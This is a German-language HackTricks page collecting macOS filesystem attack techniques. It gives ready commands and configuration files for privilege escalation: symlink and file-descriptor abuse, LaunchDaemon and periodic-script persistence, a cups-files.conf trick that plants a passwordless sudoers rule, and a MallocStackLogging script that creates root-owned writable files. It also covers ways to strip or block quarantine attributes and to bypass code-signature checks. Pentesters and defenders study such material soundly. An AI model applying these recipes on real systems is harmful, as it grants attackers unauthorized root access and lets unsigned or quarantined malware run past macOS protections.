# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX-Berechtigungskombinationen

Berechtigungen in einem **Verzeichnis**:

- **lesen** - Sie können die **Einträge** im Verzeichnis **auflisten**.
- **schreiben** - Sie können **Dateien** im Verzeichnis **löschen/schreiben** und Sie können **leere Ordner löschen**.
- Aber Sie **können keine nicht-leeren Ordner löschen/ändern**, es sei denn, Sie haben Schreibberechtigungen dafür.
- Sie **können den Namen eines Ordners nicht ändern**, es sei denn, Sie besitzen ihn.
- **ausführen** - Sie dürfen das Verzeichnis **durchqueren** - wenn Sie dieses Recht nicht haben, können Sie auf keine Dateien darin oder in Unterverzeichnissen zugreifen.

### Gefährliche Kombinationen

**Wie man eine Datei/einen Ordner, der root gehört, überschreibt**, aber:

- Ein übergeordneter **Verzeichnisbesitzer** im Pfad ist der Benutzer
- Ein übergeordneter **Verzeichnisbesitzer** im Pfad ist eine **Benutzergruppe** mit **Schreibzugriff**
- Eine Benutzer**gruppe** hat **Schreib**zugriff auf die **Datei**

Mit einer der vorherigen Kombinationen könnte ein Angreifer einen **sym/hard link** in den erwarteten Pfad **einspeisen**, um einen privilegierten beliebigen Schreibzugriff zu erhalten.

### Ordner root R+X Sonderfall

Wenn es Dateien in einem **Verzeichnis** gibt, in dem **nur root R+X-Zugriff hat**, sind diese **für niemanden sonst zugänglich**. Eine Schwachstelle, die es ermöglicht, eine von einem Benutzer lesbare Datei, die aufgrund dieser **Einschränkung** nicht gelesen werden kann, von diesem Ordner **in einen anderen** zu verschieben, könnte ausgenutzt werden, um diese Dateien zu lesen.

Beispiel in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolischer Link / Harte Verknüpfung

### Nachsichtige Datei/Ordner

Wenn ein privilegierter Prozess Daten in eine **Datei** schreibt, die von einem **weniger privilegierten Benutzer** **kontrolliert** werden könnte oder die **zuvor von einem weniger privilegierten Benutzer erstellt** wurde. Der Benutzer könnte einfach **auf eine andere Datei** über einen symbolischen oder harten Link **verweisen**, und der privilegierte Prozess wird in dieser Datei schreiben.

Überprüfen Sie in den anderen Abschnitten, wo ein Angreifer **einen beliebigen Schreibzugriff ausnutzen könnte, um Privilegien zu eskalieren**.

### Offen `O_NOFOLLOW`

Das Flag `O_NOFOLLOW`, wenn es von der Funktion `open` verwendet wird, folgt einem Symlink im letzten Pfadkomponenten nicht, folgt aber dem Rest des Pfades. Der richtige Weg, um zu verhindern, dass Symlinks im Pfad gefolgt wird, ist die Verwendung des Flags `O_NOFOLLOW_ANY`.

## .fileloc

Dateien mit der **`.fileloc`**-Erweiterung können auf andere Anwendungen oder Binärdateien verweisen, sodass beim Öffnen die Anwendung/Binärdatei ausgeführt wird.\
Beispiel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Dateideskriptoren

### Leak FD (kein `O_CLOEXEC`)

Wenn ein Aufruf von `open` das Flag `O_CLOEXEC` nicht hat, wird der Dateideskriptor vom Kindprozess geerbt. Wenn also ein privilegierter Prozess eine privilegierte Datei öffnet und einen vom Angreifer kontrollierten Prozess ausführt, wird der Angreifer **den FD über die privilegierte Datei erben**.

Wenn Sie einen **Prozess dazu bringen können, eine Datei oder einen Ordner mit hohen Rechten zu öffnen**, können Sie **`crontab`** missbrauchen, um eine Datei in `/etc/sudoers.d` mit **`EDITOR=exploit.py`** zu öffnen, sodass `exploit.py` den FD zur Datei in `/etc/sudoers` erhält und diesen ausnutzt.

Zum Beispiel: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), Code: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## Vermeiden Sie Quarantäne-xattrs-Tricks

### Entfernen Sie es
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable-Flag

Wenn eine Datei/ein Ordner dieses unveränderliche Attribut hat, ist es nicht möglich, ein xattr darauf zu setzen.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Ein **devfs**-Mount **unterstützt keine xattr**, weitere Informationen in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Diese ACL verhindert das Hinzufügen von `xattrs` zur Datei.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Das **AppleDouble**-Dateiformat kopiert eine Datei einschließlich ihrer ACEs.

Im [**Quellcode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) ist zu sehen, dass die ACL-Textdarstellung, die im xattr mit dem Namen **`com.apple.acl.text`** gespeichert ist, als ACL in der dekomprimierten Datei gesetzt wird. Wenn Sie also eine Anwendung in eine Zip-Datei im **AppleDouble**-Dateiformat mit einer ACL komprimiert haben, die das Schreiben anderer xattrs verhindert... wurde das Quarantäne-xattr nicht in die Anwendung gesetzt:

Überprüfen Sie den [**ursprünglichen Bericht**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) für weitere Informationen.

Um dies zu replizieren, müssen wir zuerst den richtigen acl-String erhalten:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Nicht wirklich notwendig, aber ich lasse es hier, nur für den Fall:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Umgehung von Signaturprüfungen

### Umgehung von Plattform-Binärprüfungen

Einige Sicherheitsprüfungen überprüfen, ob die Binärdatei eine **Plattform-Binärdatei** ist, um beispielsweise die Verbindung zu einem XPC-Dienst zu ermöglichen. Wie in einem Umgehungstrick in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ dargelegt, ist es möglich, diese Überprüfung zu umgehen, indem man eine Plattform-Binärdatei (wie /bin/ls) erhält und den Exploit über dyld mit einer Umgebungsvariable `DYLD_INSERT_LIBRARIES` injiziert.

### Umgehung der Flags `CS_REQUIRE_LV` und `CS_FORCED_LV`

Es ist möglich, dass eine ausführende Binärdatei ihre eigenen Flags ändert, um Prüfungen mit einem Code wie folgt zu umgehen:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles enthalten die Datei **`_CodeSignature/CodeResources`**, die den **Hash** jeder einzelnen **Datei** im **Bundle** enthält. Beachten Sie, dass der Hash von CodeResources auch **in der ausführbaren Datei eingebettet** ist, sodass wir damit ebenfalls nichts anstellen können.

Es gibt jedoch einige Dateien, deren Signatur nicht überprüft wird; diese haben den Schlüssel omit in der plist, wie:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Es ist möglich, die Signatur einer Ressource über die CLI mit folgendem Befehl zu berechnen:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

Ein Benutzer kann ein benutzerdefiniertes dmg, das sogar über einigen vorhandenen Ordnern erstellt wurde, einbinden. So könnten Sie ein benutzerdefiniertes dmg-Paket mit benutzerdefiniertem Inhalt erstellen:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Normalerweise mountet macOS Festplatten, indem es mit dem `com.apple.DiskArbitration.diskarbitrationd` Mach-Dienst kommuniziert (bereitgestellt von `/usr/libexec/diskarbitrationd`). Wenn man den Parameter `-d` zur LaunchDaemons plist-Datei hinzufügt und neu startet, werden die Protokolle in `/var/log/diskarbitrationd.log` gespeichert.\
Es ist jedoch möglich, Tools wie `hdik` und `hdiutil` zu verwenden, um direkt mit dem `com.apple.driver.DiskImages` kext zu kommunizieren.

## Arbiträre Schreibvorgänge

### Periodische sh-Skripte

Wenn Ihr Skript als **Shell-Skript** interpretiert werden könnte, könnten Sie das **`/etc/periodic/daily/999.local`** Shell-Skript überschreiben, das jeden Tag ausgelöst wird.

Sie können eine Ausführung dieses Skripts vortäuschen mit: **`sudo periodic daily`**

### Daemons

Schreiben Sie einen beliebigen **LaunchDaemon** wie **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** mit einer plist, die ein beliebiges Skript ausführt wie:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Erstellen Sie das Skript `/Applications/Scripts/privesc.sh` mit den **Befehlen**, die Sie als root ausführen möchten.

### Sudoers-Datei

Wenn Sie **willkürlichen Schreibzugriff** haben, könnten Sie eine Datei im Ordner **`/etc/sudoers.d/`** erstellen, die Ihnen **sudo**-Berechtigungen gewährt.

### PATH-Dateien

Die Datei **`/etc/paths`** ist einer der Hauptorte, die die PATH-Umgebungsvariable befüllen. Sie müssen root sein, um sie zu überschreiben, aber wenn ein Skript von einem **privilegierten Prozess** einen **Befehl ohne den vollständigen Pfad** ausführt, könnten Sie in der Lage sein, es zu **übernehmen**, indem Sie diese Datei ändern.

Sie können auch Dateien in **`/etc/paths.d`** schreiben, um neue Ordner in die `PATH`-Umgebungsvariable zu laden.

### cups-files.conf

Diese Technik wurde in [diesem Bericht](https://www.kandji.io/blog/macos-audit-story-part1) verwendet.

Erstellen Sie die Datei `/etc/cups/cups-files.conf` mit folgendem Inhalt:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Dies wird die Datei `/etc/sudoers.d/lpe` mit den Berechtigungen 777 erstellen. Der zusätzliche Müll am Ende dient dazu, die Erstellung des Fehlerprotokolls auszulösen.

Dann schreibe in `/etc/sudoers.d/lpe` die benötigte Konfiguration zur Eskalation der Berechtigungen wie `%staff ALL=(ALL) NOPASSWD:ALL`.

Ändere dann die Datei `/etc/cups/cups-files.conf` erneut und gebe `LogFilePerm 700` an, damit die neue sudoers-Datei gültig wird, wenn `cupsctl` aufgerufen wird.

### Sandbox Escape

Es ist möglich, die macOS-Sandbox mit einem FS-arbiträren Schreibzugriff zu verlassen. Für einige Beispiele siehe die Seite [macOS Auto Start](../../../../macos-auto-start-locations.md), aber ein gängiger ist, eine Terminal-Präferenzdatei in `~/Library/Preferences/com.apple.Terminal.plist` zu schreiben, die einen Befehl beim Start ausführt und diesen mit `open` aufruft.

## Generiere beschreibbare Dateien als andere Benutzer

Dies wird eine Datei erzeugen, die root gehört und von mir beschreibbar ist ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Dies könnte auch als privesc funktionieren:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Shared Memory

**POSIX Shared Memory** ermöglicht es Prozessen in POSIX-konformen Betriebssystemen, auf einen gemeinsamen Speicherbereich zuzugreifen, was eine schnellere Kommunikation im Vergleich zu anderen Methoden der interprozesslichen Kommunikation erleichtert. Es beinhaltet das Erstellen oder Öffnen eines Shared Memory-Objekts mit `shm_open()`, das Festlegen seiner Größe mit `ftruncate()` und das Mappen in den Adressraum des Prozesses mit `mmap()`. Prozesse können dann direkt aus diesem Speicherbereich lesen und in ihn schreiben. Um den gleichzeitigen Zugriff zu verwalten und Datenkorruption zu verhindern, werden häufig Synchronisationsmechanismen wie Mutexes oder Semaphoren verwendet. Schließlich entmappen und schließen Prozesse den Shared Memory mit `munmap()` und `close()`, und entfernen optional das Speicherobjekt mit `shm_unlink()`. Dieses System ist besonders effektiv für effiziente, schnelle IPC in Umgebungen, in denen mehrere Prozesse schnell auf gemeinsame Daten zugreifen müssen.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Beispiel für Verbrauchercode</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Geschützte Deskriptoren

**macOS geschützte Deskriptoren** sind eine Sicherheitsfunktion, die in macOS eingeführt wurde, um die Sicherheit und Zuverlässigkeit von **Dateideskriptoroperationen** in Benutzeranwendungen zu verbessern. Diese geschützten Deskriptoren bieten eine Möglichkeit, spezifische Einschränkungen oder "Schutzmaßnahmen" mit Dateideskriptoren zu verknüpfen, die vom Kernel durchgesetzt werden.

Diese Funktion ist besonders nützlich, um bestimmte Klassen von Sicherheitsanfälligkeiten wie **unbefugten Dateizugriff** oder **Rennbedingungen** zu verhindern. Diese Anfälligkeiten treten auf, wenn beispielsweise ein Thread auf eine Dateibeschreibung zugreift und **einem anderen anfälligen Thread Zugriff darauf gewährt** oder wenn ein Dateideskriptor von einem anfälligen Kindprozess **vererbt** wird. Einige Funktionen, die mit dieser Funktionalität zusammenhängen, sind:

- `guarded_open_np`: Öffnet einen FD mit einem Schutz
- `guarded_close_np`: Schließt ihn
- `change_fdguard_np`: Ändert die Schutzflags eines Deskriptors (sogar das Entfernen des Schutzes)

## Referenzen

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
